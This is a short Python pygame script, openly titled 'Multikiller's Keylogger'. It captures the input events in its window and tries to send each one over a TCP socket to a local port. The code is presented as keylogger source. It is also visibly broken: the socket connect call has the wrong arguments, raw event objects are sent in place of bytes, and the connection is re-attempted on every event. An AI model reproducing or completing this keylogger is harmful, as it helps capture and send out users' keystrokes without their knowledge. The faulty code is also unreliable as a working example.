import sys
import pygame
import socket
from pygame.locals import *
pygame.init()

size = width, height = 1320, 960
speed = [2, 2]
black = (0,0,0)
blue = (0,0,255)
green = (0,255,0)
red = (255,0,0)

screen = pygame.display.set_mode(size)

pygame.display.set_caption("Multikiller's Keylogger")

clock = pygame.time.Clock()


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
def text_objects(text, font):
    textSurface = font.render(text, True, black)
    return textSurface, textSurface.get_rect()
def connection():
    try:
        host_ip=socket.gethostbyname('127.0.0.1')
        host_port=8000
        s.connect(host_ip,host_port)
    except:
        print("Sorry Connection could not be made") 

def game_intro():

  screen.fill(black)

  pygame.display.flip()
  pygame.display.update()
  clock.tick(15)

  intro = True

  while intro:
     for event in pygame.event.get():
         connection()
         s.send(event)
         if event.type == pygame.QUIT:
             pygame.quit()
             quit()


game_intro()
